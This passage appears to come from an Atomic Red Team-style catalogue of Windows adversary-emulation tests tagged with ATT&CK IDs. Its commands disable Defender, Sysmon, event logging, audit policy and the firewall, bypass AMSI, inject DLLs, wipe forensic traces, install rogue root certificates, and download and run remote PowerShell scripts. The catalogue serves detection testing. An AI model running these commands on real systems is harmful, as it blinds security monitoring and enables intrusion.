2495: [- name: Kill Event Log Service Threads] [attack_technique: T1562.002] [      $output = "$env:TEMP\Invoke-Phant0m.ps1"]
2496: [- name: Kill Event Log Service Threads] [attack_technique: T1562.002] [      $wc = New-Object System.Net.WebClient]
2497: [- name: Kill Event Log Service Threads] [attack_technique: T1562.002] [      $wc.DownloadFile($url, $output)]
2498: [- name: Kill Event Log Service Threads] [attack_technique: T1562.002] [      cd $env:TEMP]
2499: [- name: Kill Event Log Service Threads] [attack_technique: T1562.002] [      Import-Module .\Invoke-Phant0m.ps1]
2500: [- name: Kill Event Log Service Threads] [attack_technique: T1562.002] [      Invoke-Phant0m]
2506: [- name: 'Impair Windows Audit Log Policy'] [attack_technique: T1562.002] [    command: |]
2507: [- name: 'Impair Windows Audit Log Policy'] [attack_technique: T1562.002] [      auditpol /set /category:"Account Logon" /success:disable /failure:disable]
2508: [- name: 'Impair Windows Audit Log Policy'] [attack_technique: T1562.002] [      auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable]
2509: [- name: 'Impair Windows Audit Log Policy'] [attack_technique: T1562.002] [      auditpol /set /category:"Detailed Tracking" /success:disable]
2516: [- name: 'Clear Windows Audit Policy Config'] [attack_technique: T1562.002] [    command: |]
2517: [- name: 'Clear Windows Audit Policy Config'] [attack_technique: T1562.002] [      auditpol /clear /y]
2518: [- name: 'Clear Windows Audit Policy Config'] [attack_technique: T1562.002] [      auditpol /remove /allusers]
2525: [- name: Disable Event Logging with wevtutil] [attack_technique: T1562.002] [    command: |]
2526: [- name: Disable Event Logging with wevtutil] [attack_technique: T1562.002] [      wevtutil sl "#{log_name}" /e:false]
2531: [- name: 'Makes Eventlog blind with Phant0m'] [attack_technique: T1562.002] [    command: |]
2532: [- name: 'Makes Eventlog blind with Phant0m'] [attack_technique: T1562.002] [      PathToAtomicsFolder\T1562.002\bin\Phant0m.exe]
2537: [- name: Disable Microsoft Defender Firewall] [attack_technique: T1562.004] [    command: |]
2538: [- name: Disable Microsoft Defender Firewall] [attack_technique: T1562.004] [      netsh advfirewall set currentprofile state off]
2543: [- name: Disable Microsoft Defender Firewall via Registry] [attack_technique: T1562.004] [    command: |]
2544: [- name: Disable Microsoft Defender Firewall via Registry] [attack_technique: T1562.004] [      reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f]
2549: [- name: Allow SMB and RDP on Microsoft Defender Firewall] [attack_technique: T1562.004] [    command: |]
2550: [- name: Allow SMB and RDP on Microsoft Defender Firewall] [attack_technique: T1562.004] [      netsh advfirewall firewall set rule group="remote desktop" new enable=Yes]
2551: [- name: Allow SMB and RDP on Microsoft Defender Firewall] [attack_technique: T1562.004] [      netsh advfirewall firewall set rule group="file and printer sharing" new enable=Yes]
2556: [- name: Opening ports for proxy - HARDRAIN ] [attack_technique: T1562.004] [    command: |]
2557: [- name: Opening ports for proxy - HARDRAIN ] [attack_technique: T1562.004] [      netsh advfirewall firewall add rule name="atomic testing" action=allow dir=in protocol=TCP localport=450 ]
2558: [- name: Opening ports for proxy - HARDRAIN ] [attack_technique: T1562.004] [    cleanup_command: netsh advfirewall firewall delete rule name="atomic testing" protocol=TCP localport=450 >nul 2>&1]
2561: [- name: Allow Executable Through Firewall Located in Non-Standard Location] [attack_technique: T1562.004] [    command: |]
2562: [- name: Allow Executable Through Firewall Located in Non-Standard Location] [attack_technique: T1562.004] [      Copy-Item #{exe_file_path} -Destination "C:\Users\$env:UserName" -Force]
2563: [- name: Allow Executable Through Firewall Located in Non-Standard Location] [attack_technique: T1562.004] [      netsh advfirewall firewall add rule name="Atomic Test" dir=in action=allow program="C:\Users\$env:UserName\AtomicTest.exe" enable=yes]
2569: [- name: Unload Sysmon Filter Driver] [attack_technique: T1562.001] [    command: |]
2570: [- name: Unload Sysmon Filter Driver] [attack_technique: T1562.001] [      fltmc.exe unload #{sysmon_driver}]
2578: [- name: Uninstall Sysmon] [attack_technique: T1562.001] [    command: |]
2579: [- name: Uninstall Sysmon] [attack_technique: T1562.001] [      sysmon -u]
2584: [- name: AMSI Bypass - AMSI InitFailed] [attack_technique: T1562.001] [    command: |]
2585: [- name: AMSI Bypass - AMSI InitFailed] [attack_technique: T1562.001] [      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)]
2590: [- name: AMSI Bypass - Remove AMSI Provider Reg Key] [attack_technique: T1562.001] [    command: |]
2591: [- name: AMSI Bypass - Remove AMSI Provider Reg Key] [attack_technique: T1562.001] [      Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse]
2596: [- name: Disable Arbitrary Security Windows Service] [attack_technique: T1562.001] [    command: |]
2597: [- name: Disable Arbitrary Security Windows Service] [attack_technique: T1562.001] [      net.exe stop #{service_name}]
2598: [- name: Disable Arbitrary Security Windows Service] [attack_technique: T1562.001] [      sc.exe config #{service_name} start= disabled]
2604: [- name: Tamper with Windows Defender ATP PowerShell] [attack_technique: T1562.001] [    command: |]
2605: [- name: Tamper with Windows Defender ATP PowerShell] [attack_technique: T1562.001] [      Set-MpPreference -DisableRealtimeMonitoring 1]
2606: [- name: Tamper with Windows Defender ATP PowerShell] [attack_technique: T1562.001] [      Set-MpPreference -DisableBehaviorMonitoring 1]
2607: [- name: Tamper with Windows Defender ATP PowerShell] [attack_technique: T1562.001] [      Set-MpPreference -DisableScriptScanning 1]
2608: [- name: Tamper with Windows Defender ATP PowerShell] [attack_technique: T1562.001] [      Set-MpPreference -DisableBlockAtFirstSeen 1]
2616: [- name: Tamper with Windows Defender Command Prompt] [attack_technique: T1562.001] [    command: |]
2617: [- name: Tamper with Windows Defender Command Prompt] [attack_technique: T1562.001] [      sc stop WinDefend]
2618: [- name: Tamper with Windows Defender Command Prompt] [attack_technique: T1562.001] [      sc config WinDefend start=disabled]
2619: [- name: Tamper with Windows Defender Command Prompt] [attack_technique: T1562.001] [      sc query WinDefend]
2625: [- name: Tamper with Windows Defender Registry] [attack_technique: T1562.001] [    command: |]
2626: [- name: Tamper with Windows Defender Registry] [attack_technique: T1562.001] [      Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1]
2631: [- name: Disable Microsoft Office Security Features] [attack_technique: T1562.001] [    command: |]
2632: [- name: Disable Microsoft Office Security Features] [attack_technique: T1562.001] [      New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel"]
2633: [- name: Disable Microsoft Office Security Features] [attack_technique: T1562.001] [      New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security"]
2634: [- name: Disable Microsoft Office Security Features] [attack_technique: T1562.001] [      New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"]
2635: [- name: Disable Microsoft Office Security Features] [attack_technique: T1562.001] [      New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings" -Value "1" -PropertyType "Dword"]
2636: [- name: Disable Microsoft Office Security Features] [attack_technique: T1562.001] [      New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableInternetFilesInPV" -Value "1" -PropertyType "Dword"]
2637: [- name: Disable Microsoft Office Security Features] [attack_technique: T1562.001] [      New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableUnsafeLocationsInPV" -Value "1" -PropertyType "Dword"]
2638: [- name: Disable Microsoft Office Security Features] [attack_technique: T1562.001] [      New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableAttachementsInPV" -Value "1" -PropertyType "Dword"]
2644: [- name: Remove Windows Defender Definition Files] [attack_technique: T1562.001] [    command: |]
2645: [- name: Remove Windows Defender Definition Files] [attack_technique: T1562.001] [      "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All]
2648: [- name: Stop and Remove Arbitrary Security Windows Service] [attack_technique: T1562.001] [    command: |]
2649: [- name: Stop and Remove Arbitrary Security Windows Service] [attack_technique: T1562.001] [      Stop-Service -Name #{service_name}]
2650: [- name: Stop and Remove Arbitrary Security Windows Service] [attack_technique: T1562.001] [      Remove-Service -Name #{service_name}]
2677: [- name: office-365-Disable-AntiPhishRule] [attack_technique: T1562.001] [    command: |]
2678: [- name: office-365-Disable-AntiPhishRule] [attack_technique: T1562.001] [      $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force]
2679: [- name: office-365-Disable-AntiPhishRule] [attack_technique: T1562.001] [      $creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd]
2680: [- name: office-365-Disable-AntiPhishRule] [attack_technique: T1562.001] [      Connect-ExchangeOnline -Credential $creds]
2681: [- name: office-365-Disable-AntiPhishRule] [attack_technique: T1562.001] [      $test = Get-AntiPhishRule]
2682: [- name: office-365-Disable-AntiPhishRule] [attack_technique: T1562.001] [      Disable-AntiPhishRule -Identity $test.Name -Confirm:$false]
2683: [- name: office-365-Disable-AntiPhishRule] [attack_technique: T1562.001] [      Get-AntiPhishRule]
2699: [- name: Disable Defender with Defender Control] [attack_technique: T1562.001] [    command: |]
2700: [- name: Disable Defender with Defender Control] [attack_technique: T1562.001] [      cmd /c #{DefenderControlExe} /D #{DefenderID} | Out-Null]
2705: [- name: Disable Defender Using NirSoft AdvancedRun] [attack_technique: T1562.001] [    command: |]
2706: [- name: Disable Defender Using NirSoft AdvancedRun] [attack_technique: T1562.001] [      Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}]
2707: [- name: Disable Defender Using NirSoft AdvancedRun] [attack_technique: T1562.001] [      if(#{delete_defender_folder}){]
2708: [- name: Disable Defender Using NirSoft AdvancedRun] [attack_technique: T1562.001] [        $CommandToRun = rmdir "$env:programdata\Microsoft\Windows Defender" -Recurse]
2709: [- name: Disable Defender Using NirSoft AdvancedRun] [attack_technique: T1562.001] [        Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe" /WindowState 0 /CommandLine "$CommandToRun" /StartDirectory "" /RunAs 8 /Run} Catch{}]
2710: [- name: Disable Defender Using NirSoft AdvancedRun] [attack_technique: T1562.001] [      }]
2721: [- name: Process Injection via mavinject.exe] [attack_technique: T1055.001] [    command: |]
2722: [- name: Process Injection via mavinject.exe] [attack_technique: T1055.001] [      $mypid = #{process_id}]
2723: [- name: Process Injection via mavinject.exe] [attack_technique: T1055.001] [      mavinject $mypid /INJECTRUNNING #{dll_payload}]
2724: [- name: Process Injection via mavinject.exe] [attack_technique: T1055.001] [      Stop-Process -processname notepad]
2731: [- name: Delete a single file - Windows cmd] [attack_technique: T1070.004] [    command: |]
2732: [- name: Delete a single file - Windows cmd] [attack_technique: T1070.004] [      del /f #{file_to_delete}]
2735: [- name: Delete an entire folder - Windows cmd] [attack_technique: T1070.004] [    command: |]
2736: [- name: Delete an entire folder - Windows cmd] [attack_technique: T1070.004] [      rmdir /s /q #{folder_to_delete}]
2739: [- name: Delete a single file - Windows PowerShell] [attack_technique: T1070.004] [    command: |]
2740: [- name: Delete a single file - Windows PowerShell] [attack_technique: T1070.004] [      Remove-Item -path #{file_to_delete}]
2743: [- name: Delete an entire folder - Windows PowerShell] [attack_technique: T1070.004] [    command: |]
2744: [- name: Delete an entire folder - Windows PowerShell] [attack_technique: T1070.004] [      Remove-Item -Path #{folder_to_delete} -Recurse]
2747: [- name: Delete Prefetch File] [attack_technique: T1070.004] [    command: |]
2748: [- name: Delete Prefetch File] [attack_technique: T1070.004] [      Remove-Item -Path (Join-Path "$Env:SystemRoot\prefetch\" (Get-ChildItem -Path "$Env:SystemRoot\prefetch\*.pf" -Name)[0])]
2751: [- name: Delete TeamViewer Log Files] [attack_technique: T1070.004] [    command: |]
2752: [- name: Delete TeamViewer Log Files] [attack_technique: T1070.004] [      Remove-Item #{teamviewer_log_file}]
2755: [- name: Create Windows System File with Attrib] [attack_technique: T1564.001] [    command: |]
2756: [- name: Create Windows System File with Attrib] [attack_technique: T1564.001] [      attrib.exe +s #{file_to_modify}]
2761: [- name: Create Windows Hidden File with Attrib] [attack_technique: T1564.001] [    command: |]
2762: [- name: Create Windows Hidden File with Attrib] [attack_technique: T1564.001] [      attrib.exe +h #{file_to_modify}]
2767: [- name: Hide Files Through Registry] [attack_technique: T1564.001] [    command: |]
2768: [- name: Hide Files Through Registry] [attack_technique: T1564.001] [      reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f]
2769: [- name: Hide Files Through Registry] [attack_technique: T1564.001] [      reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 0 /f]
2775: [- name: Hidden Window] [attack_technique: T1564.003] [    command: |]
2776: [- name: Hidden Window] [attack_technique: T1564.003] [      Start-Process #{powershell_command}]
2779: [- name: Extract binary files via VBA] [attack_technique: T1564] [    command: |]
2780: [- name: Extract binary files via VBA] [attack_technique: T1564] [      $macro = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1564\src\T1564-macrocode.txt")]
2781: [- name: Extract binary files via VBA] [attack_technique: T1564] [      $macro = $macro -replace "aREPLACEMEa", "PathToAtomicsFolder\T1564\bin\extractme.bin"]
2782: [- name: Extract binary files via VBA] [attack_technique: T1564] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
2783: [- name: Extract binary files via VBA] [attack_technique: T1564] [      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)]
2784: [- name: Extract binary files via VBA] [attack_technique: T1564] [      Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap]
2789: [- name: Indicator Removal using FSUtil] [attack_technique: T1070] [    command: |]
2790: [- name: Indicator Removal using FSUtil] [attack_technique: T1070] [      fsutil usn deletejournal /D C:]
2795: [- name: Indirect Command Execution - pcalua.exe] [attack_technique: T1202] [    command: |]
2796: [- name: Indirect Command Execution - pcalua.exe] [attack_technique: T1202] [      pcalua.exe -a #{process}]
2797: [- name: Indirect Command Execution - pcalua.exe] [attack_technique: T1202] [      pcalua.exe -a #{payload_path}]
2800: [- name: Indirect Command Execution - forfiles.exe] [attack_technique: T1202] [    command: |]
2801: [- name: Indirect Command Execution - forfiles.exe] [attack_technique: T1202] [      forfiles /p c:\windows\system32 /m notepad.exe /c #{process}]
2804: [- name: Indirect Command Execution - conhost.exe] [attack_technique: T1202] [    command: |]
2805: [- name: Indirect Command Execution - conhost.exe] [attack_technique: T1202] [      conhost.exe "#{process}"]
2808: [- name: Install root CA on Windows] [attack_technique: T1553.004] [    command: |]
2809: [- name: Install root CA on Windows] [attack_technique: T1553.004] [      $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My]
2810: [- name: Install root CA on Windows] [attack_technique: T1553.004] [      Move-Item -Path $cert.PSPath -Destination "Cert:\LocalMachine\Root"]
2820: [- name: Install root CA on Windows with certutil] [attack_technique: T1553.004] [    command: |]
2821: [- name: Install root CA on Windows with certutil] [attack_technique: T1553.004] [      certutil -addstore my #{pfx_path}]
2830: [- name: Add Root Certificate to CurrentUser Certificate Store] [attack_technique: T1553.004] [    command: |]
2831: [- name: Add Root Certificate to CurrentUser Certificate Store] [attack_technique: T1553.004] [       IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) ]
2836: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] [    command: |]
2837: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] [      # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly]
2838: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] [      . #{test_harness}]
2839: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] []
2840: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] [      $InstallerAssemblyDir = "#{assembly_dir}"]
2841: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] [      $InstallerAssemblyFileName = "#{assembly_filename}"]
2842: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] [      $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName]
2843: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] []
2844: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] [      $ExpectedOutput = 'Constructor_']
2845: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] []
2846: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] [      $TestArgs = @{]
2847: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] [          OutputAssemblyDirectory = $InstallerAssemblyDir]
2848: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] [          OutputAssemblyFileName = $InstallerAssemblyFileName]
2849: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] [          InvocationMethod = '#{invocation_method}']
2850: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] [      }]
2851: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] []
2852: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] [      $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly]
2853: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] []
2854: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] [      if ($ActualOutput -ne $ExpectedOutput) {]
2855: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] [          throw @"]
2856: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] [      CheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.]
2857: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] [      Expected: $ExpectedOutput]
2858: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] [      Actual: $ActualOutput]
2859: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] [      "@]
2860: [- name: CheckIfInstallable method call] [attack_technique: T1218.004] [      }]
2868: [- name: InstallHelper method call] [attack_technique: T1218.004] [    command: |]
2869: [- name: InstallHelper method call] [attack_technique: T1218.004] [      # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly]
2870: [- name: InstallHelper method call] [attack_technique: T1218.004] [      . #{test_harness}]
2871: [- name: InstallHelper method call] [attack_technique: T1218.004] []
2872: [- name: InstallHelper method call] [attack_technique: T1218.004] [      $InstallerAssemblyDir = "#{assembly_dir}"]
2873: [- name: InstallHelper method call] [attack_technique: T1218.004] [      $InstallerAssemblyFileName = "#{assembly_filename}"]
2874: [- name: InstallHelper method call] [attack_technique: T1218.004] [      $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName]
2875: [- name: InstallHelper method call] [attack_technique: T1218.004] []
2876: [- name: InstallHelper method call] [attack_technique: T1218.004] [      $CommandLine = "/logfile= /logtoconsole=false `"$InstallerAssemblyFullPath`""]
2877: [- name: InstallHelper method call] [attack_technique: T1218.004] [      $ExpectedOutput = 'Constructor_']
2878: [- name: InstallHelper method call] [attack_technique: T1218.004] []
2879: [- name: InstallHelper method call] [attack_technique: T1218.004] [      $TestArgs = @{]
2880: [- name: InstallHelper method call] [attack_technique: T1218.004] [          OutputAssemblyDirectory = $InstallerAssemblyDir]
2881: [- name: InstallHelper method call] [attack_technique: T1218.004] [          OutputAssemblyFileName = $InstallerAssemblyFileName]
2882: [- name: InstallHelper method call] [attack_technique: T1218.004] [          InvocationMethod = '#{invocation_method}']
2883: [- name: InstallHelper method call] [attack_technique: T1218.004] [          CommandLine = $CommandLine]
2884: [- name: InstallHelper method call] [attack_technique: T1218.004] [      }]
2885: [- name: InstallHelper method call] [attack_technique: T1218.004] []
2886: [- name: InstallHelper method call] [attack_technique: T1218.004] [      $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly]
2887: [- name: InstallHelper method call] [attack_technique: T1218.004] []
2888: [- name: InstallHelper method call] [attack_technique: T1218.004] [      if ($ActualOutput -ne $ExpectedOutput) {]
2889: [- name: InstallHelper method call] [attack_technique: T1218.004] [          throw @"]
2890: [- name: InstallHelper method call] [attack_technique: T1218.004] [      InstallHelper method execution test failure. Installer assembly execution output did not match the expected output.]
2891: [- name: InstallHelper method call] [attack_technique: T1218.004] [      Expected: $ExpectedOutput]
2892: [- name: InstallHelper method call] [attack_technique: T1218.004] [      Actual: $ActualOutput]
2893: [- name: InstallHelper method call] [attack_technique: T1218.004] [      "@]
2894: [- name: InstallHelper method call] [attack_technique: T1218.004] [      }]
2902: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] [    command: |]
2903: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] [      # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly]
2904: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] [      . #{test_harness}]
2905: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] []
2906: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] [      $InstallerAssemblyDir = "#{assembly_dir}"]
2907: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] [      $InstallerAssemblyFileName = "#{assembly_filename}"]
2908: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] [      $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName]
2909: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] []
2910: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] [      $CommandLine = "/logfile= /logtoconsole=false `"$InstallerAssemblyFullPath`""]
2911: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] [      $ExpectedOutput = 'Constructor_']
2912: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] []
2913: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] [      $TestArgs = @{]
2914: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] [          OutputAssemblyDirectory = $InstallerAssemblyDir]
2915: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] [          OutputAssemblyFileName = $InstallerAssemblyFileName]
2916: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] [          InvocationMethod = '#{invocation_method}']
2917: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] [          CommandLine = $CommandLine]
2918: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] [      }]
2919: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] []
2920: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] [      $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly]
2921: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] []
2922: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] [      if ($ActualOutput -ne $ExpectedOutput) {]
2923: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] [          throw @"]
2924: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] [      InstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.]
2925: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] [      Expected: $ExpectedOutput]
2926: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] [      Actual: $ActualOutput]
2927: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] [      "@]
2928: [- name: InstallUtil class constructor method call] [attack_technique: T1218.004] [      }]
2936: [- name: InstallUtil Install method call] [attack_technique: T1218.004] [    command: |]
2937: [- name: InstallUtil Install method call] [attack_technique: T1218.004] [      # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly]
2938: [- name: InstallUtil Install method call] [attack_technique: T1218.004] [      . #{test_harness}]
2939: [- name: InstallUtil Install method call] [attack_technique: T1218.004] []
2940: [- name: InstallUtil Install method call] [attack_technique: T1218.004] [      $InstallerAssemblyDir = "#{assembly_dir}"]
2941: [- name: InstallUtil Install method call] [attack_technique: T1218.004] [      $InstallerAssemblyFileName = "#{assembly_filename}"]
2942: [- name: InstallUtil Install method call] [attack_technique: T1218.004] [      $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName]
2943: [- name: InstallUtil Install method call] [attack_technique: T1218.004] []
2944: [- name: InstallUtil Install method call] [attack_technique: T1218.004] [      $CommandLine = "/logfile= /logtoconsole=false /installtype=notransaction /action=install `"$InstallerAssemblyFullPath`""]
2945: [- name: InstallUtil Install method call] [attack_technique: T1218.004] [      $ExpectedOutput = 'Constructor_Install_']
2946: [- name: InstallUtil Install method call] [attack_technique: T1218.004] []
2947: [- name: InstallUtil Install method call] [attack_technique: T1218.004] [      $TestArgs = @{]
2948: [- name: InstallUtil Install method call] [attack_technique: T1218.004] [          OutputAssemblyDirectory = $InstallerAssemblyDir]
2949: [- name: InstallUtil Install method call] [attack_technique: T1218.004] [          OutputAssemblyFileName = $InstallerAssemblyFileName]
2950: [- name: InstallUtil Install method call] [attack_technique: T1218.004] [          InvocationMethod = '#{invocation_method}']
2951: [- name: InstallUtil Install method call] [attack_technique: T1218.004] [          CommandLine = $CommandLine]
2952: [- name: InstallUtil Install method call] [attack_technique: T1218.004] [      }]
2953: [- name: InstallUtil Install method call] [attack_technique: T1218.004] []
2954: [- name: InstallUtil Install method call] [attack_technique: T1218.004] [      $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs]
2955: [- name: InstallUtil Install method call] [attack_technique: T1218.004] []
2956: [- name: InstallUtil Install method call] [attack_technique: T1218.004] [      if ($ActualOutput -ne $ExpectedOutput) {]
2957: [- name: InstallUtil Install method call] [attack_technique: T1218.004] [          throw @"]
2958: [- name: InstallUtil Install method call] [attack_technique: T1218.004] [      InstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.]
2959: [- name: InstallUtil Install method call] [attack_technique: T1218.004] [      Expected: $ExpectedOutput]
2960: [- name: InstallUtil Install method call] [attack_technique: T1218.004] [      Actual: $ActualOutput]
2961: [- name: InstallUtil Install method call] [attack_technique: T1218.004] [      "@]
2962: [- name: InstallUtil Install method call] [attack_technique: T1218.004] [      }]
2970: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] [    command: |]
2971: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] [      # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly]
2972: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] [      . #{test_harness}]
2973: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] []
2974: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] [      $InstallerAssemblyDir = "#{assembly_dir}"]
2975: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] [      $InstallerAssemblyFileName = "#{assembly_filename}"]
2976: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] [      $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName]
2977: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] []
2978: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] [      $CommandLine = "/logfile= /logtoconsole=false /U `"$InstallerAssemblyFullPath`""]
2979: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] [      $ExpectedOutput = 'Constructor_Uninstall_']
2980: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] []
2981: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] [      $TestArgs = @{]
2982: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] [          OutputAssemblyDirectory = $InstallerAssemblyDir]
2983: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] [          OutputAssemblyFileName = $InstallerAssemblyFileName]
2984: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] [          InvocationMethod = '#{invocation_method}']
2985: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] [          CommandLine = $CommandLine]
2986: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] [      }]
2987: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] []
2988: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] [      $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs]
2989: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] []
2990: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] [      if ($ActualOutput -ne $ExpectedOutput) {]
2991: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] [          throw @"]
2992: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] [      InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.]
2993: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] [      Expected: $ExpectedOutput]
2994: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] [      Actual: $ActualOutput]
2995: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] [      "@]
